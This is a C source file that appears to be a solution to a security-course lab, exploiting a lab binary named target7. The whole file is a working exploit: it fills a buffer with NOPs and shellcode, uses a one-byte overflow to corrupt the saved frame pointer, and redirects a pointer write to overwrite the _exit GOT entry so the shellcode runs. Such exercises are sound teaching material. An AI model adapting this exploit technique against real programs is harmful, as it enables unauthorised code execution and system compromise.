#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target7"
#define NOOP 0x90                 // no-op instruction
#define BUFLEN 336                // target buffer length
#define OVERWRITING_BYTE_LEN 1    // the extra byte we are overwritting to change FP
#define BUF_START 0xffffdb98      // where the shellcode startsdi
#define OVERWRITING_BYTE 0xe8 // the extra byte we are overwritting to change FP to point to itself
#define EXIT_JMP_ADDR 0x804c00c
#define EBP_MINUS8_BUF_IDX 328
#define EBP_MINUS4_BUF_IDX 332

// assembly for *p = a:
// => 0x0804923d <+36>:    mov    -0x8(%ebp),%edx
//    0x08049240 <+39>:    mov    -0x4(%ebp),%eax
//    0x08049243 <+42>:    mov    %edx,(%eax)

// assembly for _exit@plt:
  //  0x8049040 <_exit@plt>:       jmp    *0x804c00c
  //  0x8049046 <_exit@plt+6>:     push   $0x0
  //  0x804904b <_exit@plt+11>:    jmp    0x8049030

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFLEN + OVERWRITING_BYTE_LEN];
  memset(buf, NOOP, sizeof(buf) - 1);
  // set the last byte in the buffer to be the overwritting byte
  buf[BUFLEN] = OVERWRITING_BYTE;

  memcpy(buf, shellcode, sizeof(shellcode) - 1);

  *(unsigned int *)(buf + EBP_MINUS8_BUF_IDX) = BUF_START;
  *(unsigned int *)(buf + EBP_MINUS4_BUF_IDX) = EXIT_JMP_ADDR;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
